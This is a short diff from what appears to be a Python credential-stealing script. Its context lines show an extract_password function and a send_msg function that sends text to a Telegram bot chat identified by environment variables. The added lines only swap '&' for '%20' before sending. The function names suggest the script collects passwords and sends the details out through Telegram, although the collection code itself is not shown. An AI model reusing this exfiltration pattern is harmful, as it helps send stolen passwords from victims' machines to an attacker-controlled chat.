@@ -11,6 +11,8 @@ def extract_password():
     return dc
 
 def send_msg(msg):
+    #replace every & in msg with %20
+    msg = msg.replace("&", "%20")
     requests.get(f"https://api.telegram.org/bot{os.environ.get('TELEGRAM_BOT_API')}/sendMessage?chat_id={os.environ.get('TELEGRAM_CHAT_ID')}&text="+ msg)
 
 def send_details():
